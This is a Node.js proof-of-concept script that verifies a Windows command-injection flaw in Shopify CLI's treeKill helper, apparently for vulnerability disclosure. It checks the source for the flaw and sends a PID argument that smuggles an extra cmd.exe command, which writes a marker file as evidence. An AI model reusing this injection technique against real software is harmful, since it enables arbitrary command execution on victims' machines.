#!/usr/bin/env node
import {existsSync, mkdirSync, readFileSync, unlinkSync, writeFileSync, appendFileSync} from 'fs'
import path from 'path'
import {fileURLToPath, pathToFileURL} from 'url'

const findingDir = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(findingDir, '../../..')
const evidenceDir = path.join(findingDir, 'evidence')
const exploitLog = path.join(evidenceDir, 'exploit.log')
const impactLog = path.join(evidenceDir, 'impact.log')
const markerText = 'SHOPIFY_CLI_TREEKILL_POC'
const markerFile = path.join(evidenceDir, 'tree-kill-win32-marker.txt')

mkdirSync(evidenceDir, {recursive: true})
writeFileSync(exploitLog, `treeKill Windows command-injection PoC\nplatform=${process.platform}\nnode=${process.version}\n`)
writeFileSync(impactLog, '')

function log(line) {
  appendFileSync(exploitLog, `${line}\n`)
}

function impact(line) {
  appendFileSync(impactLog, `${line}\n`)
}

function finish(status, evidence, notes = '') {
  const result = {status, evidence, notes}
  log(`result=${JSON.stringify(result)}`)
  console.log(JSON.stringify(result))
}

function sourceStillVulnerable() {
  const sourcePath = path.join(repoRoot, 'packages/cli-kit/src/public/node/tree-kill.ts')
  if (!existsSync(sourcePath)) return false
  const source = readFileSync(sourcePath, 'utf8')
  const acceptsStringPid = /treeKill\s*\([\s\S]*pid:\s*number\s*\|\s*string/.test(source)
  const weakValidation = source.includes('Number.isNaN(rootPid)')
  const shellInterpolation = source.includes('exec(`taskkill /pid ${pid} /T /F`, callback)')
  impact(`source=${sourcePath}`)
  impact(`acceptsStringPid=${acceptsStringPid}`)
  impact(`weakValidation=${weakValidation}`)
  impact(`shellInterpolation=${shellInterpolation}`)
  return acceptsStringPid && weakValidation && shellInterpolation
}

async function loadTreeKill() {
  const localDist = path.join(repoRoot, 'packages/cli-kit/dist/public/node/tree-kill.js')
  const attempts = []
  if (existsSync(localDist)) attempts.push(pathToFileURL(localDist).href)
  attempts.push('@shopify/cli-kit/node/tree-kill')

  let lastError
  for (const specifier of attempts) {
    try {
      log(`import=${specifier}`)
      return await import(specifier)
    } catch (error) {
      lastError = error
      log(`import failed for ${specifier}: ${error.message}`)
    }
  }
  throw lastError
}

if (process.platform !== 'win32') {
  const vulnerable = sourceStillVulnerable()
  console.log('This exploit requires a Windows Node.js runtime because the vulnerable branch is process.platform === "win32".')
  finish(
    'inconclusive',
    vulnerable
      ? 'source contains string PID validation bypass and taskkill exec interpolation; Windows cmd.exe branch not executed'
      : 'Windows cmd.exe branch not executed',
    'Run this same poc.js on Windows after building @shopify/cli-kit to create the marker file.',
  )
} else {
  try {
    if (existsSync(markerFile)) unlinkSync(markerFile)
    const {treeKill} = await loadTreeKill()
    if (typeof treeKill !== 'function') throw new Error('treeKill export not found')

    const payload = `2147483647 & echo ${markerText}>"${markerFile}" & rem`
    log(`payload=${payload}`)
    await new Promise((resolve) => {
      treeKill(payload, 'SIGTERM', true, (error, stdout, stderr) => {
        if (error) log(`callbackError=${error.message}`)
        if (stdout) log(`stdout=${stdout}`)
        if (stderr) log(`stderr=${stderr}`)
        resolve()
      })
    })

    if (existsSync(markerFile) && readFileSync(markerFile, 'utf8').includes(markerText)) {
      impact(`markerFile=${markerFile}`)
      impact(`markerContents=${readFileSync(markerFile, 'utf8').trim()}`)
      finish('confirmed', `marker file created by injected cmd.exe command: ${markerFile}`)
    } else {
      finish('failed', 'marker file was not created', `Expected ${markerFile}`)
    }
  } catch (error) {
    finish('inconclusive', 'PoC could not load or execute treeKill', error.message)
  }
}
